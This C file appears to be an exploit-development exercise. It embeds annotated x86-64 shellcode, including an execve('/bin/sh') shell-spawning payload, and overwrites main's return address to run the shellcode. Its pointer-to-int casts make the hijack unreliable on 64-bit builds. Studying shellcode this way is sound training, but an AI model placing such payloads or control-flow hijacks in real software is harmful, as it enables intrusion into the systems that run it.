#include <stdio.h>
#include <unistd.h>

//check for return value of 0x31 - echo $? after execution
char exit_code[] = 	"\x48\x31\xc0"	//xor    %rax,%rax
	"\xb0\x3c"	//mov    $0x3c,%al
	"\x48\x31\xff"	//xor    %rdi,%rdi
	"\x40\xb7\x31"	//mov    $0x31,%dil
	"\x0f\x05";	//syscall 


//check for return value of 0x31 - 64 bit instructions
char hello_world_code[] = 	"\xeb\x1a"	//jmp    40009c <_start+0x1c>
	"\x48\x31\xc0"	//xor    %rax,%rax
	"\xb0\x01"	//mov    $0x1,%al
	"\x48\x31\xff"	//xor    %rdi,%rdi
	"\x40\xb7\x01"	//mov    $0x1,%dil
	"\x5e"	//pop    %rsi
	"\x48\x31\xd2"	//xor    %rdx,%rdx
	"\xb2\x0f"	//mov    $0xf,%dl
	"\x0f\x05"	//syscall 
	"\x48\x31\xc0"	//xor    %rax,%rax
	"\xb0\x3c"	//mov    $0x3c,%al
	"\x0f\x05"	//syscall 
	"\xe8\xe1\xff\xff\xff"	//callq  400082 <_start+0x2>
	"\x48"	//rex.W
	"\x65"	//gs
	"\x6c"	//insb   (%dx),%es:(%rdi)
	"\x6c"	//insb   (%dx),%es:(%rdi)
	"\x6f"	//outsl  %ds:(%rsi),(%dx)
	"\x2c\x20"	//sub    $0x20,%al
	"\x77\x6f"	//ja     400119 <_start+0x99>
	"\x72\x6c"	//jb     400118 <_start+0x98>
	"\x64"	//fs
	"\x21";	//.byte 0x21


char shellcode[] = 	"\xeb\x1b"	//jmp    40009d <_start+0x1d>
	"\x48\x31\xc0"	//xor    %rax,%rax
	"\x50"	//push   %rax
	"\x5a"	//pop    %rdx
	"\x5f"	//pop    %rdi
	"\x50"	//push   %rax
	"\x48\x89\xf8"	//mov    %rdi,%rax
	"\x50"	//push   %rax
	"\x54"	//push   %rsp
	"\x5e"	//pop    %rsi
	"\x48\x31\xc0"	//xor    %rax,%rax
	"\xb0\x3b"	//mov    $0x3b,%al
	"\x0f\x05"	//syscall 
	"\x48\x31\xc0"	//xor    %rax,%rax
	"\xb0\x3c"	//mov    $0x3c,%al
	"\x0f\x05"	//syscall 
	"\xe8\xe0\xff\xff\xff"	//callq  400082 <_start+0x2>
	"\x2f"	//(bad)  
	"\x62"	//(bad)  
	"\x69"	//.byte 0x69
	"\x6e"	//outsb  %ds:(%rsi),(%dx)
	"\x2f"	//(bad)  
	"\x73\x68";	//jae    400111 <_start+0x91>


int main(int argc, char **argv) {
	int *ret; 
	//ret points to the return address now
	ret =  (int *)&ret + 4;
	switch (argv[1][0]) {
		case '1':	
			(*ret) = (int)exit_code; 
			break;
		case '2':
			(*ret) = (int)hello_world_code;
			break;
		default:
			(*ret) = (int)shellcode;
	}
	return 0;
}
